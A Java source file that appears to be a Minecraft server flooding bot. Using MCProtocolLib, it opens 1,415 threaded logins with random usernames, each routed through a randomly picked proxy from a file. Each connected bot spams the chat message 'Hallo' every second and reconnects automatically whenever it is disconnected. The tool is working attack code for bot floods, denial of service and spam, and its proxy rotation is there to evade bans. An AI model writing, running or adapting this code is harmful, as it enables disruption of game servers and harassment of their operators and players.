package com.ak;

import org.geysermc.mcprotocollib.auth.SessionService;
import org.geysermc.mcprotocollib.network.ProxyInfo;
import org.geysermc.mcprotocollib.network.Session;
import org.geysermc.mcprotocollib.network.event.session.DisconnectedEvent;
import org.geysermc.mcprotocollib.network.event.session.DisconnectingEvent;
import org.geysermc.mcprotocollib.network.event.session.SessionAdapter;
import org.geysermc.mcprotocollib.network.packet.Packet;
import org.geysermc.mcprotocollib.network.tcp.TcpClientSession;
import org.geysermc.mcprotocollib.protocol.MinecraftConstants;
import org.geysermc.mcprotocollib.protocol.MinecraftProtocol;
import org.geysermc.mcprotocollib.protocol.packet.ingame.clientbound.ClientboundLoginPacket;
import org.geysermc.mcprotocollib.protocol.packet.ingame.serverbound.ServerboundChatPacket;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

import java.io.File;
import java.time.Instant;
import java.util.ArrayList;
import java.util.BitSet;
import java.util.concurrent.ThreadLocalRandom;

public class ExoriaBot {
    private static final Logger log = LoggerFactory.getLogger(ExoriaBot.class);
    private static final boolean SPAWN_SERVER = true;
    private static final boolean VERIFY_USERS = false;
    private static final String HOST = "";
    private static final int PORT = 25565;
    private static int connecteds = 0;

    public static void main(String[] args) {
        ArrayList<ProxyInfo> proxies = (ArrayList<ProxyInfo>) ProxyLoader.loadProxies(new File("proxies.txt"));

        Thread mainThread = new Thread(() -> {

            for (int i = 0; i < 1415; i++) {


                Thread thread = new Thread(() -> {
                    login(generateRandomUser(), proxies.get((int) (Math.random() * proxies.size())));
                });
                thread.start();
            }
        });

        mainThread.start();
    }

    private static String generateRandomUser() {
        String ALPHANUMERIC = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
        return java.util.stream.IntStream.range(0, ThreadLocalRandom.current().nextInt(3, 17))
                .mapToObj(i -> String.valueOf(ALPHANUMERIC.charAt(ThreadLocalRandom.current().nextInt(ALPHANUMERIC.length()))))
                .collect(java.util.stream.Collectors.joining());
    }

    private static void login(String username, ProxyInfo PROXY) {
        MinecraftProtocol protocol;

        protocol = new MinecraftProtocol(username);
        SessionService sessionService = new SessionService();
        sessionService.setProxy(PROXY);

        Session client = new TcpClientSession(HOST, PORT, protocol, PROXY);
        client.setFlag(MinecraftConstants.SESSION_SERVICE_KEY, sessionService);

        System.out.println("Logging in as " + username + " with proxy " + PROXY.type() + " " + PROXY.address());


        client.addListener(new SessionAdapter() {

            @Override
            public void disconnected(DisconnectedEvent event) {
                log.info("Disconnected: {}" + event.getReason());
                client.connect(true);
            }

            @Override
            public void disconnecting(DisconnectingEvent event) {
                log.info("DisconnectingEvent: {}", event.getReason());
                client.connect(true);
            }

            @Override
            public void packetReceived(Session session, Packet packet) {
                if (packet instanceof ClientboundLoginPacket) {
                    log.info("Connected: " + username);
                    connecteds++;
                    while (session.isConnected()) {
                        session.send(new ServerboundChatPacket("Hallo", Instant.now().toEpochMilli(), 0L, null, 0, new BitSet()));
                        try {
                            Thread.sleep(1000);
                        } catch (InterruptedException e) {
                            e.printStackTrace();
                        }
                    }
                }
            }
        });

        client.connect();

        log.info("Conectados: " + connecteds);
    }

}
